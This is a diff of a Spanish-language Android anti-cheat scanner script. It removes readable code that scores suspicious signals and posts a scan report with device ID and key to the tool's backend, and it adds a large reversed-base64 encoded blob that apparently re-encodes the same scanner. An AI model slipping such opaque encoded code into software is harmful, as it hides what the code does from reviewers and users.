-    [ $FOUND_DELTA -eq 0 ] && log_output "${G}[✓] Sin procesos sospechosos nuevos durante el scan${N}"
-    echo ""
-}
-
-_send_scan_report() {
-    local _pk="" _verdict="" _det_json="[]"
-    if [ -n "$ACCESS_KEY_USED" ]; then
-        _pk="$ACCESS_KEY_USED"
-    elif [ -f "$KEY_FILE" ]; then
-        _pk=$(sed -n '1p' "$KEY_FILE" | tr -d '\r\n' || true)
-    fi
-
-    if   [ "${SUSPICIOUS_COUNT:-0}" -eq 0 ];  then _verdict="clean"
-    elif [ "${SUSPICIOUS_COUNT:-0}" -lt 10 ]; then _verdict="suspicious"
-    else                                           _verdict="cheat"
-    fi
-
-    if [ -f "${LOGFILE:-}" ]; then
-        local _raw
-        _raw=$(grep -E '\[!\]|\[✓\]|\[✓\]|\[v\]|\[\+\]' "$LOGFILE" 2>/dev/null \
-            | sed 's/\x1b\[[0-9;]*[mK]//g' \
-            | sed 's/\r//g;s/^[[:space:]]*//' \
-            | grep -Ev '^[[:space:]]*$|^[═─]+$|^\[+\] Iniciando|^\[+\] Conectando|^\[+\] Prefetch' \
-            | head -120)
-        if [ -n "$_raw" ]; then
-            _det_json="["
-            local _first=1
-            while IFS= read -r _line; do
-                [ -z "$_line" ] && continue
-                [ $_first -eq 0 ] && _det_json+=","
-                local _esc
-                _esc=$(printf '%s' "$_line" | sed 's/\\/\\\\/g;s/"/\\"/g')
-                _det_json+="\"${_esc}\""
-                _first=0
-            done <<< "$_raw"
-            _det_json+="]"
-        fi
-    fi
-
-    local _di _hwid_esc _game_esc _pk_esc _payload
-    _di=$(printf '{"brand":"%s","model":"%s","android":"%s"}' \
-        "${DEVICE_BRAND:-}" "${DEVICE_MODEL:-}" "${ANDROID_VER:-}")
-    _hwid_esc=$(printf '%s' "${DEVICE_HWID:-}" | sed 's/"/\\"/g')
-    _game_esc=$(printf '%s' "${GAME_SELECTED:-}" | sed 's/"/\\"/g')
-    _pk_esc=$(printf '%s' "${_pk}" | sed 's/"/\\"/g')
-
-    _payload=$(printf '{"hwid":"%s","player_name":"%s","version":"%s","premium_key":"%s","verdict":"%s","signals":%d,"detections":%s,"device_info":%s}' \
-        "$_hwid_esc" "$_game_esc" "$SCANNER_VERSION" "$_pk_esc" "$_verdict" \
-        "${SUSPICIOUS_COUNT:-0}" "$_det_json" "$_di")
-
-    curl -sf -X POST "${BACKEND_URL}/api/android/scan/report" \
-        -H "Content-Type: application/json" \
-        -H "x-session-token: ${SESSION_TOKEN}" \
-        -d "$_payload" \
-        --max-time 10 --connect-timeout 5 >/dev/null 2>&1 || true
-}
-show_summary() {
-    sec_hdr "RESUMEN DEL ANÁLISIS"
-    log_output "${B}[*] Juego: ${W}$GAME_SELECTED${N}"
-    log_output "${B}[*] Señales sospechosas: ${W}$SUSPICIOUS_COUNT${N}"
-    [ -n "$DEVICE_HWID" ] && log_output "${B}[*] HWID: ${Y}$DEVICE_HWID${N}"
-    echo ""
-
-    if [ $SUSPICIOUS_COUNT -eq 0 ]; then
-        verdict_box "$G" "  ✓  DISPOSITIVO LIMPIO  ✓  "
-    elif [ $SUSPICIOUS_COUNT -lt 10 ]; then
-        verdict_box "$Y" "  !  REVISAR MANUALMENTE — NO DAR W.O  !  "
-    else
-        verdict_box "$R" "  ✗  ALTO RIESGO DE CHEATS  ✗  "
-    fi
-
-    log_output "\n${M}[*] Log: ${W}$LOGFILE${N}"
-    _send_scan_report &
-}
-
-pedir_key
-check_storage
-main_menu
+_c=()
+_c+='=oQduVWbf5Wah1mCldWYy9Gdz91ajVGajpQelt2XylGZlBnCK0nCwAibyVHdlJHIgACIKsHIpgSe'
+_c+='lt2XtVXatVmcw91ajVGajpQfKADIuJXd0VmcgACIgogI950ek4SZ05WZtxWYy9GctVGdg8GZhRXa'
+_c+='slmYhhGI5V2ag4WazBybzV2YjFEIdpyW9l1ekICI0VHc0V3bfd2bsBCIgAiCiQWZsJWYzlGZi0DR'
+_c+='FNVVflVRL91UTV0QDFEIgACIKICZlxmYhNXakJSPTVkUJBFWF9lTPl0UTV0UflVRLBCIgAiCiISP'
+_c+='OV0SPR1XO9USTNVRTBCIgAiC7BSKokXZr9lcpRWZwpgL5V2afJXakVGcgIXaulmZlRWZyBiblRWZ'
+_c+='1BHIz92Yp1WYulGZgMXZ1F3bsJGIz9mb1dGbhBiOMFkTJZEIMFkUPBVTFRFITNVQQllQgMiCK0nC'
+_c+='mACdy9GclJ3XuF2Yz9FZuV2cfBCIgAiCi0nT7RSRMlkRH9ETk03V7RCI6c2bMBSXqsVfNtHJuxlI'
+_c+='gQXdwRXdv91ZvxGIgACIKoQamBCIgAiCiACIXyp4gAyUUFURINEIFREIPd0UFlkUg8EVMFEIgcJn'
+_c+='iDCIiAiISRiIgg3bi9FdjlGZyVmdgACIgACIgAiClNHblBCIgAiCiACIhACIP5yVgIVQEByTOBCl'
+_c+='AKOIFRlTF1ETBVlTB1EISF0UJZVRSBCIhACIiAiIZRiIgg3bi9FdjlGZyVmdgACIgACIgAiCuVGa'
+_c+='0ByOdBCMxACds1CIU5UVPN0XTV1TJNUSQNVVTRCIbBiZpxWZgACIgogIgAykcKOIg8USQ1USMByT'
+_c+='WlEVJN1TQNVSEBCITyp4gAiIgIyRkICI49mYfR3YpRmclZHIgACIgACIgogblhGdgsTXgADIxVWL'
+_c+='gQlTV90QfNVVPl0QJB1UVNFJgsFImlGIgACIKogIiAyboNWZgACIgogI950ekQUSXh0XFNUSWVER'
+_c+='k0XW7RCI6QUSXhEIdpyW9J0ekICI0VHc0V3bfd2bsBiJmASXgICRJdFSfV0QJZVRERiIg4WLgsFI'
+_c+='gACIKISfOtHJU5UVPN0XTV1TJNUSQNVVTRSfXtHJgozchN3boNWZwN3bzByclxWYxOcZTBSXqsVf'
+_c+='CtHJiACd1BHd192Xn9GbgACIgogI950ekQURUNURMV0UfVUTBdEJ9d1ekAiOvdWZ1pEIdpyW9J0e'
+_c+='kICI0VHc0V3bfd2bsBCIgAiCiMVSTlETBOsTBBCTFREIOVUTVNVRSJCIyRGafNWZzBCIgAiC7BSK'
+_c+='oknch1Wb1N3X39GazpQfKUWdyRHI8xHIxYiPyACbsVnbvYXZk9iPgUDI0V3bl1Wa01CdjVmbu92Y'
+_c+='t0CIwEDIl1Wa01Ceh1WLtACIgACIgACIKwFIiQWYvxWehB3XkICIk1CIgACIgACIgoAXgISfOV0S'
+_c+='PR1XO9USTNVRTtHJgojblt2b01ibvl2czV2ctgnIggULgACIgACIgAiCcBiIu92cq9ibvlGdhNWa'
+_c+='sBHchBiOlBXeU1CduVGdu92QiACStACIgACIgACIKwFIiQncvBXZy9ibhN2cvQWavJHZuF2LpBXY'
+_c+='v0HTSV1XE5URLNUQCtHJiACVT9EUggVLgY2ctACbyV3YgACIgogCpISak9FJiAiIu92cq9FdlR2X'
+_c+='kICIi0HMtoDVOV1TD91UV9USDlEUTV1U7RiIgACIgACIgAiCcBiI0NWakJXZ29FJiAiIjNXZftGc'
+_c+='fRiIgIiTPl0USVkVfJVRO5UQDNFJiAiIjNXZfVWbhd2XkICIiM2cl9FZpdHafRiIgACIgACIgAiC'
+_c+='cByJ9NXJ6Iybm5WafV2YpZXZkJCLzViOiMnbvlGdjVGdlRmIsQWJ6IycsFmbnl2ciwiIzViI6ICd'
+_c+='jlGZyVmdiwiIzViI6ISelt2XtVXatVmcwJCLiMXJiojIu9WazJXZ2JCLiMXJiojIl1WYu9lcllXY'
+_c+='sBnIsIyclIiOiQWa3hmI7dCImRnbpJHcoQSPkF2bslXYw9FIgACIKoQKnc2LiwFXvIyLzdCIkV2c'
+_c+='gwHIi03aw91ekICInMXJnAiZ05WayBHKk0zYzV2XrB3XgACIgoQKnc2LiwFXvIyLzdCIkV2cgwHI'
+_c+='i0XL6QURUNURMV0UfVUTBd0ekICInMXJnAiZ05WayBHKk0zYzV2Xl1WYn9FIgACIKkyJn9iIcx1L'
+_c+='i8ycnACZlNHI8BiI91iOEl0VI9VRDlkVFR0ekICInMXJnAiZ05WayBHKk0zYzV2Xkl2do9FIgACI'
+_c+='KkiI91iOSVkVfRUSPJFROF0ekICIi0XL6wURE9UTfV0QJZVREtHJiAiI91iOE5UQSJ0XFNUSWVER'
+_c+='7RiIgACIgACIgAiCcByJ9JyclIiOiQWavJHZuFmIsIyclIiOiwWZk9WbiwiIzViI6ICZuFmciJye'
+_c+='nAiZ05WayBHKk0Tak9FIgACIKQWYvxWehB3XgM2cl91aw9FIjNXZfVWbhd2XgM2cl9FZpdHafBSa'
+_c+='k9FIsF2YvxGIgACIKoQamBCIgAiCpZGIgACIgACIgogIdJSPr42bzp2X0VGZfBCIgACIgACIgACI'
+_c+='gogI3FmcfRiIgwDP8ASZu9GZgACIgACIgACIgACIKATP0NncpZ2XgACIgACIgACIgACIgACIgogI'
+_c+='iwVfjNXZftHJiwlI9sibvNnafRXZk9FIgACIgACIgACIgACIgACIKkyJn9iIcx1Li8yc7c2LcxFX'
+_c+='c9CXc9ycnACZlNHI8BiIl5Was9FJiAyJzVyJgYGdulmcwhCJ9M2cl9FIgACIgACIgACIgACIgACI'
+_c+='KM2cl9FIsF2YvxGIgACIgACIgACIgACIgACIKICLi0zKu92cq9FdlR2XgYiJg0FIwAScl1CI0Nnc'
+_c+='pZ2XkAyWgACIgACIgACIgACIgACIgoQZ15Wa052bjBiJmASXgISZulGbfRiIgoXLgsFIgACIgACI'
+_c+='gACIgACIgACIK8GZgsTZulGbfBictACZhVmcg0zUGlEIlxWaodHIgACIgACIgACIgAiCx0DdzJXa'
+_c+='m9FIsF2YvxGIgACIgACIgACIgAiCislI942bzp2X0VGZfBCIgACIgACIgACIgogblhGdgsTXgIyd'
+_c+='hJ3XkICIu1CIbBiZpBCIgACIgACIKkCMyETLgQWYlhGI8BCIgACIgACIgACIgoAXgcCajRXZmVmc'
+_c+='QBSXctyWc5FfvRmbhR3Yl52bDBSXctyWc5FfvRmbhl2Yp5WSg0FXrsFXexHJr0FgUKOkVK+WexHJ'
+_c+='q0VX6U2YhB3c6s1WedCI2VULgAXZydGI8BCIgACIgACIgACIgoAXgcyLvoSXdpTZjFGczpzWb51L'
+_c+='ztzZv8icc9ycnACZlNHI8BCIgACIgACIgACIgoAXgcyZv8SXL12Wq01O50CMbtFXiFDec9ycnACZ'
+_c+='lNHI8BCIgACIgACIgACIgoAXgwGb152L2VGZv4jMgISRMlkRH9ETkICIn0FXrw1WcxXXcZ3WcxXX'
+_c+='cNJnivFX81FXTyp4bxFfdxVIbx1JgUULgAXZydGKk0zdhJ3XgACIgACIgAiC3FmcfBCbhN2bsBCI'
+_c+='gACIgACIK4WZoRHI70FIi0XL6UETJZ0RPx0ekICIm1CIbBiZpBCIgAiCKkmZgACIgogI0FWZoNmI'
+_c+='9Q3YpRmclZ3XgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgU2csVGI'
+_c+='gACIKIyc19WajlGczV3ci0DdjlGZyVmdfBiblhGdgsTXgATMgQHbtAiI9BTL6QlTV90QfNVVPl0Q'
+_c+='JB1UVN1ekICIbBiZpxWZgACIgogIuFWZsNmI9Q3YpRmclZ3Xg4WZoRHIgsTXgADIxVWLgISfw0iO'
+_c+='U5UVPN0XTV1TJNUSQNVVTtHJiAyWgACImlGIgACIKoQamBCIgAiCpUWdyRHI8xHIn4GXyx1JgQWL'
+_c+='gIHdgwHIiUETJZ0XZV0SkICInAXMnAibtACZlNHKk0zaw9FIgACIgACIgogblhGdgsTXgISRMlkR'
+_c+='flVRLRiIgYWLgsFImlGblBCIgAiCiQURTV1XZV0SfN1UFN0QBRiI9sGcfBCIgACIgACIK4WZoRHI'
+_c+='70FIiQURTV1XZV0SfN1UFN0QBRiIg4WLgsFImlGIgACIKISXbJSPu92cq9FdlR2XgIiI9Q3YpRmc'
+_c+='lZ3XgIiI9sGcfBCbhN2bsBCIgAiC7BSKoQncvBXZy9lbhN2cfRmblN3XKoQfKIiIg8GajVGIgACI'
+_c+='KISfOtHJuF2YzBCblBSZ05WYyVHZgM3b2VWduBycvN3boNWZwN3bzBycvNXZj9mcwBibpNFIdNJn'
+_c+='ivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIBRFTFR0XE5UVPZEJgsFIgACIKoQamBCIgAiC'
+_c+='iMFRJB1XT9kVFVlTkICI8wDPgUmbvRGIgACIgACIgoQamBCIgACIgACIgACIgoQM9EEVMVERfRkT'
+_c+='V9kRgsTKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIgACIgACIgAiCi0nT7RSKklGckACR'
+_c+='JBFKgUUTB50XD9kUQRCI64UQDNFIMVEIFRlTBJVVEByTJNURSFEUBByTT9ESDVEUT90Ug80UFN0T'
+_c+='SBFIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgACIgAiCuVGa0ByOnQSdzxXdrVneph2c'
+_c+='8RWZz9GczxGfkV2cvBHe8t2cpdWYtx3czFGc5JGf0FWZoNGfr92boxXYklmcmdCIFlWctACclJ3Z'
+_c+='gwHIiUUTB50XD9kUQRiIg8GajVGImlGIgACIgACIgACIgAiCpcSfG5EJgQnbpJHc7dCIrdXYgwHI'
+_c+='iUkTJx0XD9kUQRiIg8GajVGKk0TRNFkTfN0TSBFIgACIgACIgACIgAiCpETLgQWYlhGI8ByJ9Rnb'
+_c+='pJHc7BCc90jMkcCIiQWawRiI9AHI21CIrdXYgwHIi4USG9FVPh0UQFkTT91UQRiIg8GajVGKk0TR'
+_c+='OlETfN0TSBFIgACIgACIgACIgAiClVnbpRnbvNGImYCIdBiIklGckICI61CIbBCIgACIgACIgACI'
+_c+='gowbkByOklGcgIXLgQWYlJHIlxWaodHIgACIgACIgogblhGdgsTXgIyUElEUfN1TWVUVORiIg4WL'
+_c+='gsFImlGIgACIKoAM9EEVMVERfRkTV9kRgACIgoQKsxWdu9idlR2L+IDIpIiTJZ0XTRUSQRiIg8Ga'
+_c+='jVGK8ASKi8USDlkTJ91UElEUkICIvh2YlhCPgMTMtASbt92YoQSPTRUSQ91UPZVRV5EIgACIKoQK'
+_c+='0J3bzBCfgcSfyQCI05WayB3enAya3FGI8BCIgAiIOlkRfR1TINFUB50UfNFUkICIvh2YlhCJ94US'
+_c+='G91UElEUgACIgoQK0J3bzBCfgcSfyQCI05WayB3enAya3FGI8BiIPl0QJ5USfR1TINFUB50UfNFU'
+_c+='kICIvh2YlhCJ98USDlkTJ91UElEUgACIgogCpciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDIB1CI'
+_c+='zBnIgwGblh2cgIGZhhCJ94USG9FVPh0UQFkTT91UQBCIgAiCi0nT7RiLu4ibhN2cgwWZkBibpZGI'
+_c+='zZHIvl2Yp5WagM3bzV2YvJHcg8GZuFmchBXbvNEIdtyW9J0ekICI0VHc0V3bfd2bsBCIgAiCikSQ'
+_c+='UxUREhCIOF0QTBCTFBSRU5UQSVFRgM1TWVUVOByUPNVRD9kUQJCIyRGafNWZzBCIgAiC7BSKoEGd'
+_c+='sVGZfN3clN2byB3XrNWZoNmCK0nCiICIvh2YlBCIgAiCi0nT7RCdhN2ZvxGIuVGIz9mdlVnbgM3b'
+_c+='z9GajVGcz92cgM3b05WZ2VGIul2Ug01kcK+W9d0ekICI0VHc0V3bfd2bsBiJmASXgADIxVWLgc0T'
+_c+='M9FROV1TGRCIbBCIgAiCKkmZgACIgoQM9c0TM9FROV1TGByOpkyKrQlTV90QfNVVPl0QJB1UVNFK'
+_c+='oACIgACIgACIKUmbvRGI7ISfOtHJsRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIsRiIg4WLgsFI'
+_c+='vRGI7wGIy1CIkFWZyBSZslGa3BCfgIyRPx0XINVQSNEJiAyboNWZgACIgACIgAiCi0nT7RiOpUGb'
+_c+='iFGdzVmbpBCdhVGajBSZsJWaz9GcoAibhN2cgwWZgUGduFmc1RGIvdWZ1pGIsVGZgg2chJ3Qg0VI'
+_c+='b1XW7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgIyRPx0XINVQSNEJiAibtAyWgYWagACI'
+_c+='goQKz0CIkFWZoBCfgISfHtEUfVUTBd0ekICIp1CIwVmcnBCfgISKikCZtACN2U2chJGfn8mTYlVe'
+_c+='OdUSspFWhBjRtJGOONjYnAiZ05WayBHKkICIikCZtACN2U2chJGfn0zdykVdVJTW5lTbahDeVFVV'
+_c+='GtmUnAiZ05WayBHKkICInMXJzVyJgYGdulmcwhCJiASRp1CIwVmcnBCfgIyTWVUVO91RPxEJiAyb'
+_c+='oNWZoQSPH9ETfh0UBJ1QgACIgogCpZGIgACIKETPH9ETfRkTV9kRgsTKpMTPrQlTV90QfNVVPl0Q'
+_c+='JB1UVNFKoACIgACIgACIKUmbvRGI7ISfOtHJsRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIsRiI'
+_c+='g4WLgsFIvRGI7wGIy1CIkFWZyBSZslGa3BCfgIyRPx0XU90TSRiIg8GajVGIgACIgACIgogI950e'
+_c+='kojTBN0UgwURgUEVOFkUVREIU90TSBSREBCRBRUSWlEVDFEIdFyW9J1ekICI0VHc0V3bfd2bsBCI'
+_c+='gACIgACIK4WZoRHI70FIic0TM9FVP9kUkICIu1CIbBiZpBCIgAiCpMTLgQWYlhGI8ByJ49mbrdCI'
+_c+='FlmdtACclJ3ZgwHInQWZ05WYydGIzNXZjNWY8d3bsxWYq4yazl2Zh1GfyV2c1JXZwV3c8R3bvJHI'
+_c+='kVGduFmcnxHI6U3cnASRp1CIwVmcnBCfgIyTWVUVO91RPxEJiAyboNWZoQSPH9ETfR1TPJFIgACI'
+_c+='KoQamBCIgAiCx0zRPx0XE5UVPZEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCl52b'
+_c+='kByOi0nT7RCbkACI9l1ekICI0VHc0V3bfd2bsBiJmASXgICbkICIu1CIbBybkByOsBictACZhVmc'
+_c+='gUGbph2dgwHIic0TM9FVDVkSOlEJiAyboNWZgACIgACIgAiCi0nT7RiOOF0QTBCTFBSRU5UQSVFR'
+_c+='gc0TMBiTFBSQT9ESDVEUT90UgQUQElkVJR1QBBSXhsVfStHJiACd1BHd192Xn9GbgACIgACIgAiC'
+_c+='uVGa0ByOdBiIH9ETfR1QFpkTJRiIg4WLgsFImlGIgACIKkSNtACZhVGagwHIngGdlJXamVWZyZmK'
+_c+='uAXb1RGItBHfrNXanlneilGb8RWZz9GcYRWRilGb8Rnch9FZlN3bwhnYpxGfkVGdzVWdxVmcgU2Y'
+_c+='pZnclNnKuQmYkFGf5V2agQ3YlpmbJxnbvlGdv1GI0NWZq5WS85Gb05WayB1ZvxEfu9Wa0NWYnl2c'
+_c+='gQWZr92boxHbh52ZpNHIkV2av9Ga8NHbh5mclRnbp1yapZHbhRGf3VWaW52b0RXdClXZLxHduVmd'
+_c+='FRXdw5WS0NWZq5Wa8JXZoNGdhB3cpREd1BnbJxXZsd2bvdGf49mbrdCIFlmdtACclJ3ZgwHInQXY'
+_c+='lh2Y8N3chBXeixHZlN3bwNHb8RWZz9Gc4xXYklmcmx3av9Ga8R3YlpmbpdCIFlWLgAXZydGI8BiI'
+_c+='PZVRV50XH9ETkICIvh2YlhCJ9c0TM9FVDVkSOlEIgACIKoAM9c0TM9FROV1TGBCIgAiCKkCMwUDI'
+_c+='u1CIslWY0BCfgICTBVFVDF0XH9ETkICIvh2YlhCJ98kVFVlTfd0TMBiJmASXgIyTWVUVO91RPxEJ'
+_c+='iAietAyWgACIgoQKysCIu1CIslWY0BCfgwGb152L2VGZv4jMgISROlETfR1UBx0XH9ETkICI5kTO'
+_c+='5kTOgEULgAXZydGI8BiIMFUVUNUQfd0TMRiIg8GajVGKk0zTWVUVO91RPxEIgACIKoQKnIHXnACZ'
+_c+='tAic0BCfgICMwAjNg4WLgwWahRHI8BCbsVnbvYXZk9iPyACbsFGIi1CIk1CI0F2Yn9GbiACbsVGa'
+_c+='zBiYkFGKk0DTBVFVDF0XH9ETgACIgogI950ek4iLu4WYjNHIsVGZg8WajlmbpBSZkNXZkBycvZXZ'
+_c+='15GIz9GduVmdlBybk5WYyVHdwF2Qg01Kb1nQ7RiIgQXdwRXdv91ZvxGIgACIKIiTBN0UgwURgUEV'
+_c+='OFkUVREIUF0QH9ETg4URgM1TWVUVOByUPRlTFZVRiAickh2XjV2cgACIgowegkCKhRHblR2X0F2Y'
+_c+='n9Gbft2Ylh2YKoQfKIiIg8GajVGIgACIKISfOtHJvN3boNWZwN3bzBybs92YvR3byBHIlRGIz9Gd'
+_c+='yVWdwBibpNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIPR1TSB1XE5UVPZEJgsFI'
+_c+='gACIKoQamBCIgAiCx0zTU9kUQ9FROV1TGByOpkiM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACI'
+_c+='gogI950ekADOwEDIvRnclVHcg4WZg8mdpR3YhBSe49mcwBSNTt0QPNFIdFyW9J1ekICI0VHc0V3b'
+_c+='fd2bsBCIgACIgACIK4WZoRHI70FIikyJdpTZjFGczpzWnACZtAic0BCfgISNTt0QPNFJiAyboNWZ'
+_c+='oQiIg4WLgsFImlGIgACIKkiI4MDNwojIgkWLgAXZydGI8ByJ9NDJgQnbpJHc7dCIrdXYgwHIiUES'
+_c+='DF0QfB1QURiIg8GajVGKk0TNTt0QPNFIgACIKoQZu9GZgACIgoQamBCIgACIgACIKETPPR1TSB1X'
+_c+='E5UVPZEI7kSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKISfOtHJp82cvh2YlB3c'
+_c+='vNHIvRnclVHcoASY2lGdjFGIvR3byBHJg42bphXZu92Qg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACI'
+_c+='gACIgACIgAiCuVGa0ByOi0HWFh0XUJ1TQtHJ6ICIxlWLgAXZydGI8BiIT5kTPN0XQNEVkICIvh2Y'
+_c+='lBiZpBCIgACIgACIKISfd9GdvJHcks1UUJ1TQ91TU9kUQtHJi0DWFh0XUJ1TQBCIgACIgACIK8GZ'
+_c+='gsjI91FQbNFVS9EUf9EVPJFUhsHJiAibpByb09mcwBicvZGIgACIKoQKgACIgogI4IkMyISPdJCO'
+_c+='4gDOtkFWPJFUisFIgACIgACIgogIwkjRxISPdJCM4ADOtkFWPJFUisFIgACIgACIgogI4MDNwISP'
+_c+='dJyULN0TTJyWgACIgACIgAiCiMTRzAjI90lIMN1UtMDUPBlIbBCIgACIgACIKISR2ADMi0TXiMDU'
+_c+='PBlIbBCIgACIgACIKISMFNDMi0TXiw0UT1CUB1USisFIgACIgACIgogIGhDMwISPdJCUB1USisFI'
+_c+='gACIgACIgogI5EDMwISPdJCUU10UisFIgACIgACIgogI1EDMwISPdJCUUZkIbBCIgACIgACIKIiN'
+_c+='xADMi0TXig0UTJyWgACIgACIgAiCo0zUUJ1TQ91TU9kUQBCIgAiCTRlUPB1XPR1TSBFIB1CIlJXY'
+_c+='sNWZkBCIgAiCKkSdtACdy92cgwHIiM3clJHZkF2XtVmciAidtACclJ3ZgwHIn03MkACdulmcwt3J'
+_c+='gs2dhBCfgISRINUQD9FUDRFJiAyboNWZoQSPT5kTPN0XQNEVgACIgogCw0zTU9kUQ9FROV1TGBCI'
+_c+='gAiCikyULN0TT9CUB1USvAFVG9CSTNFKgM1TT9ESDVEUT90UgM1TUJVRVBlIgIHZo91YlNHIgACI'
+_c+='KsHIpgycs92YvR3byB3XlZXa0NWYft2Ylh2YKoQfKIiIg8GajVGIgACIKISfOtHJzVGbh1mcv5GI'
+_c+='kFGZpZXa0NWZu92YgkHIT5ERg01kcK+W9d0ekICI0VHc0V3bfd2bsBiJmASXgADIxVWLgMlTE9FR'
+_c+='OV1TGRCIbBCIgAiCKUmbvRGIgACIKkmZgACIgACIgAiCi0nT7RySPBiUFZlUFNFJgEGIkFGZpZXa'
+_c+='0NWZu92Qg01kcK+W9d0ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgogblhGdgsTXgIiUfdkTJBFJ'
+_c+='iAibtAyWgYWasVGIgACIgACIgoQM9MlTE9FROV1TGByOpkyKrQlTV90QfNVVPl0QJB1UVNFKoACI'
+_c+='gACIgACIgACIgogI950ek8WZ1F3bsJGIlxmYpN3bwBClAKOISVkVSV0UkASYgQWYklmdpR3Yl52b'
+_c+='jBibpNFIdFyW9l1ekICI0VHc0V3bfd2bsBCIgACIgACIgACIgogblhGdgsjIlADMxwXZsJWYoNWY'
+_c+='lJnb1JCIFFXLgAXZydGI8BiIS91ROlEUkICIvh2YlBiZpBCIgACIgACIKkyJyx1JgQWLgIHdgwHI'
+_c+='icSJwATM8VGbiFGajFWZy5Wd81TZtlGdnASRtACclJ3ZgwHIsxWdu9idlR2L+IDISVkVSV0UkAyM'
+_c+='gcVLgEDIj1CIn5WawJCIsxWZoNHIiRWYoQSPS91ROlEUgACIgACIgAiCvRGI7ICOugjL44COiAiI'
+_c+='x4SMuEjLxICIulGISVkVSV0UgI3bmBCIgAiCKUmbvRGIgACIKkmZgACIgACIgAiCx0zUOR0XE5UV'
+_c+='PZEI7kSKy0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgACIgACIKISfOtHJMFkVfNlTERCI6kib'
+_c+='zOcajBXZjJXZ05WagUGbil2cvBHKg82cvh2YlB3cvNHIT5ERg0VIb1nU7RiIgQXdwRXdv91ZvxGI'
+_c+='gACIgACIgACIgAiCuVGa0ByOiMlTE9lTX9kTLRiIgUUctACclJ3ZgwHIiwUQW91UOREJiAyboNWZ'
+_c+='gECImlGIgACIgACIgoQZ15Wa052bjBiJmASXgICTBZ1XT5ERkICI61CIbBCIgACIgACIK8GZgsjI'
+_c+='yMlTERiIgISMT5ERkICIulGIMFkVfNlTEBicvZGIgACIKISKkwnLcdjMxwnLc1VMws1MuwlM3EDf'
+_c+='uwVX50CMbJjLcJzNxwnLc1VOtYzWx4CXycTM85CXwEDf4YTMuwlM5EDfwQTMuwFN5wHOyIjLcVDO'
+_c+='xw3N24CX4AjM8JTMx4CX5QTM8ljLcljLclDfuwFMuwVM85CXx4CXxwnLcRjLchDfuwFOuwFOo4lI'
+_c+='9MlTE9lTX9kTLBCIgAiCKISfOtHJ99GZhJXdnlmZu92Yg8mbtojMT5ER7RSfXtHJgozbpJXYk5Wd'
+_c+='jV2cgMlTEBSXqsVfCtHJiACd1BHd192Xn9GbgACIgogI950ek03bkFmc1dWam52bjBybu1iOxMlT'
+_c+='EtHJ9d1ekACIgozbpJXYtlmcwByUOREIdpyW9J0ekICI0VHc0V3bfd2bsBCIgAiCpciccdCIk1CI'
+_c+='yRHI8BiIsxWdu9idlR2L+IDIyMnbk5Cdl5GIw9mcwRXZnJCIsxWZoNHIiRWYoQSPyMlTEBiJmASX'
+_c+='gIiMT5ERkICI61CIbBCIgAiCpciccdCIk1CIyRHI8BiIsxWdu9idlR2L+IDIxMnbk5Cdl5GIw9mc'
+_c+='wRXZnJCIsxWZoNHIiRWYoQSPxMlTEBiJmASXgISMT5ERkICI61CIbBCIgAiCpETLgQWYlhGI8ByJ'
+_c+='dt1JgQWLgIHdgwHInQSXcpiLbx1JgU0btACclJ3ZgwHInIiMz5GZuQXZuJyJgAXZydGI8BiIFh0Q'
+_c+='BN0XQ9kUQRiIg8GajVGKk0jMT5ERgACIgoQKx0CIkFWZoBCfgcSXbdCIk1CIyRHI8ByJk0FXq4yW'
+_c+='cdCIF9WLgAXZydGI8ByJiEzcuRmL0VmbicCIwVmcnBCfgISRINUQD9FUPJFUkICIvh2YlhCJ9EzU'
+_c+='OREIgACIKoAM9MlTE9FROV1TGBCIgAiCiQURSBSREBiTTOcSDBVRDJVRU5USg8CIT5ERgMVSTlET'
+_c+='BOsTBJCIyRGafNWZzBCIgAiC7BSKoMnbk9VZ2lGdjF2XrNWZoNmCK0nCiICIvh2YlBCIgAiCpZGI'
+_c+='gACIKISfOtHJvRWa0lWbvBClAKOIp12bhlGWg8mdpRXaz9GczlGZgMXZg8mTg01kcK+W9d0ekICI'
+_c+='0VHc0V3bfd2bsBCIgACIgACIKU2csVGIgACIKISfOtHJp12bhlGWgM3chBXeiBSZkByclJ3bkF2Y'
+_c+='pRmbpBibpNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIJ10XE5UVPZEJgsFIgACI'
+_c+='gACIgogCpZGIgACIgACIgoQM9kUTfRkTV9kRgsTKpsyKU5UVPN0XTV1TJNUSQNVVThCKgACIgACI'
+_c+='gACIgACIKISfOtHJTNVQQllQflUTkAiOJVVSNBiblBybkF2YpZWak9WbgkHdpJXZW1STEBSXhsVf'
+_c+='ZtHJiACd1BHd192Xn9GbgACIgACIgACIgACIK4WZoRHI70FIiM1UBBVWC9VSNRiIg4WLgsFImlGI'
+_c+='gACIgACIgoQKnQiXnAidtACclJ3ZgwHInIHXnACZtAic0BCfgICbsVnbvYXZk9iPyASe0lmclZ3X'
+_c+='tR2XlxmYhNXak5Sa1lWbuQ3cpNnclBHIw9mcwRXZnBCIgACIgACIgACIgAyOsxWdu9idlR2L+IDI'
+_c+='5RXayVmdf1GZfVGbiF2cpRmLpVXat5ybyBCcvJHc0V2ZiACbsVGazBiYkFGKk0zUTFEUZJ0XJ1EI'
+_c+='gACIgACIgogCpZGIgACIgACIgoQM9kUTfRkTV9kRgsTKpITPrQlTV90QfNVVPl0QJB1UVNFKoACI'
+_c+='gACIgACIgACIgoQZu9GZgsjI950ekYGJgASfZtHJiACd1BHd192Xn9GbgYiJg0FIiYGJiAibtAyW'
+_c+='g8GZgsjZgIXLgQWYlJHIlxWaodHI8BiIVN1XJ1EJiAyboNWZgACIgACIgACIgACIKISfOtHJ6kUV'
